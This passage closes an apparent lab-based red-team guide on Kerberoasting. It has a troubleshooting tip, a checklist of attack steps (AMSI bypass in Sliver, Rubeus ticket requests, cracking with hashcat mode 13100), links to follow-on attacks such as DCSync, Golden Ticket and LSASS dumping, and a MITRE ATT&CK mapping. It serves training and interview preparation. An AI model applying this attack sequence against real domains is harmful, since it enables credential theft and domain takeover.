## 13.5: Credentials Don't Work After Cracking

**Password might have changed.** Check pwdLastSet:
```powershell
Get-ADUser svc_backup -Properties PasswordLastSet
```

If password was changed AFTER you got the ticket, it won't work.

---

# ✅ VERIFICATION CHECKLIST

- [ ] Understand Kerberos TGT vs TGS flow
- [ ] Know why TGS is encrypted with service account hash
- [ ] Ran Enable-Kerberoasting.ps1 on DC01
- [ ] Applied AMSI bypass in Sliver
- [ ] Ran Rubeus kerberoast via execute-assembly
- [ ] Saved hashes correctly (no line wrapping)
- [ ] Cracked hashes with hashcat -m 13100
- [ ] Verified credentials work
- [ ] Identified if account is privileged (BloodHound)
- [ ] Can answer all 10 interview questions

---

# 🔗 Next Steps

**If you got Domain Admin (svc_backup):**
→ **[04b. DCSync](./04b_dcsync_attack.md)** - Dump all domain hashes
→ **[07. Golden Ticket](./07_golden_ticket.md)** - Create persistent access

**If you need to escalate further:**
→ **[05. ACL Abuse](./05_acl_abuse.md)** - Abuse permissions
→ **[06. Pass-the-Hash](./06_pass_the_hash.md)** - Lateral movement

**Related attacks:**
→ **[03. AS-REP Roasting](./03_asrep_roasting.md)** - Similar offline attack
→ **[04. Credential Dumping](./04_credential_dumping.md)** - Dump LSASS

---

**MITRE ATT&CK Mapping:**

| Technique | ID | Description |
|-----------|-----|-------------|
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Request TGS and crack offline |
| Credential Access | T1003 | Obtaining credential material |

---

**Interview Importance:** ⭐⭐⭐⭐⭐ (Asked in almost EVERY AD interview)

